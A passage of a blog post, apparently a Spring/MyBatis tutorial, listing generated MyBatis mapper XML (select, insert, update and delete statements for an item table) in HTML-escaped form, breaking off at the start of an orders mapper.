    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
    from item
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;orderByClause != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
      order by ${orderByClause}
    &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;selectByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt; resultMap&lt;/span&gt;&lt;span&gt;=&quot;ResultMapWithBLOBs&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    select 
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Base_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
    ,
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Blob_Column_List&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;&lt;span&gt;
    from item
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;delete &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;deleteByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    delete from item
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;delete &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;deleteByExample&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.ItemExample&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    delete from item
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;delete&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;insert &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;insert&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Item&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    insert into item (id, name, price, 
      pic, createtime, detail
      )
    values (#{id,jdbcType=INTEGER}, #{name,jdbcType=VARCHAR}, #{price,jdbcType=REAL}, 
      #{pic,jdbcType=VARCHAR}, #{createtime,jdbcType=TIMESTAMP}, #{detail,jdbcType=LONGVARCHAR}
      )
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;insert &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;insertSelective&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Item&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    insert into item
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;(&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; suffixOverrides&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;id != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        id,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;name != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        name,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;price != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        price,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;pic != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        pic,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;createtime != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        createtime,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;detail != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        detail,
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;trim &lt;/span&gt;&lt;span&gt;prefix&lt;/span&gt;&lt;span&gt;=&quot;values (&quot;&lt;/span&gt;&lt;span&gt; suffix&lt;/span&gt;&lt;span&gt;=&quot;)&quot;&lt;/span&gt;&lt;span&gt; suffixOverrides&lt;/span&gt;&lt;span&gt;=&quot;,&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;id != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{id,jdbcType=INTEGER},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;name != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{name,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;price != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{price,jdbcType=REAL},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;pic != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{pic,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;createtime != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{createtime,jdbcType=TIMESTAMP},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;detail != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        #{detail,jdbcType=LONGVARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;trim&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;insert&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;select &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;countByExample&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.ItemExample&quot;&lt;/span&gt;&lt;span&gt; resultType&lt;/span&gt;&lt;span&gt;=&quot;java.lang.Integer&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    select count(*) from item
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;select&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByExampleSelective&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;map&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update item
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;set &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.id != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        id = #{record.id,jdbcType=INTEGER},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.name != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        name = #{record.name,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.price != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        price = #{record.price,jdbcType=REAL},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.pic != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        pic = #{record.pic,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.createtime != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        createtime = #{record.createtime,jdbcType=TIMESTAMP},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;record.detail != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        detail = #{record.detail,jdbcType=LONGVARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByExampleWithBLOBs&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;map&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update item
    set id = #{record.id,jdbcType=INTEGER},
      name = #{record.name,jdbcType=VARCHAR},
      price = #{record.price,jdbcType=REAL},
      pic = #{record.pic,jdbcType=VARCHAR},
      createtime = #{record.createtime,jdbcType=TIMESTAMP},
      detail = #{record.detail,jdbcType=LONGVARCHAR}
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByExample&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;map&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update item
    set id = #{record.id,jdbcType=INTEGER},
      name = #{record.name,jdbcType=VARCHAR},
      price = #{record.price,jdbcType=REAL},
      pic = #{record.pic,jdbcType=VARCHAR},
      createtime = #{record.createtime,jdbcType=TIMESTAMP}
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;_parameter != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;include &lt;/span&gt;&lt;span&gt;refid&lt;/span&gt;&lt;span&gt;=&quot;Update_By_Example_Where_Clause&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByPrimaryKeySelective&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Item&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update item
    &lt;/span&gt;&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;set &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;name != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        name = #{name,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;price != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        price = #{price,jdbcType=REAL},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;pic != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        pic = #{pic,jdbcType=VARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;createtime != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        createtime = #{createtime,jdbcType=TIMESTAMP},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
      &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;if &lt;/span&gt;&lt;span&gt;test&lt;/span&gt;&lt;span&gt;=&quot;detail != null&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
        detail = #{detail,jdbcType=LONGVARCHAR},
      &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;if&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;set&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByPrimaryKeyWithBLOBs&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Item&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update item
    set name = #{name,jdbcType=VARCHAR},
      price = #{price,jdbcType=REAL},
      pic = #{pic,jdbcType=VARCHAR},
      createtime = #{createtime,jdbcType=TIMESTAMP},
      detail = #{detail,jdbcType=LONGVARCHAR}
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;update &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;updateByPrimaryKey&quot;&lt;/span&gt;&lt;span&gt; parameterType&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Item&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;&lt;span&gt;
    update item
    set name = #{name,jdbcType=VARCHAR},
      price = #{price,jdbcType=REAL},
      pic = #{pic,jdbcType=VARCHAR},
      createtime = #{createtime,jdbcType=TIMESTAMP}
    where id = #{id,jdbcType=INTEGER}
  &lt;/span&gt;&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;update&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;/&lt;/span&gt;&lt;span&gt;mapper&lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;h3&gt;OrdersMapper.xml&lt;/h3&gt;
&lt;div class=&quot;cnblogs_code&quot; readability=&quot;109&quot;&gt;
&lt;pre&gt;
&lt;span&gt;&amp;lt;?&lt;/span&gt;&lt;span&gt;xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; &lt;/span&gt;&lt;span&gt;?&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;!&lt;/span&gt;&lt;span&gt;DOCTYPE mapper PUBLIC &quot;-//mybatis.org//DTD Mapper 3.0//EN&quot; &quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot; &lt;/span&gt;&lt;span&gt;&amp;gt;&lt;/span&gt;
&lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;mapper &lt;/span&gt;&lt;span&gt;namespace&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.mapper.OrdersMapper&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
  &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;resultMap &lt;/span&gt;&lt;span&gt;id&lt;/span&gt;&lt;span&gt;=&quot;BaseResultMap&quot;&lt;/span&gt;&lt;span&gt; type&lt;/span&gt;&lt;span&gt;=&quot;com.cyb.ssm.po.Orders&quot;&lt;/span&gt; &lt;span&gt;&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;id &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;id&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;INTEGER&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
    &lt;span&gt;&amp;lt;&lt;/span&gt;&lt;span&gt;result &lt;/span&gt;&lt;span&gt;column&lt;/span&gt;&lt;span&gt;=&quot;user_id&quot;&lt;/span&gt;&lt;span&gt; property&lt;/span&gt;&lt;span&gt;=&quot;userId&quot;&lt;/span&gt;&lt;span&gt; jdbcType&lt;/span&gt;&lt;span&gt;=&quot;INTEGER&quot;&lt;/span&gt; &lt;span&gt;/&amp;gt;&lt;/span&gt;
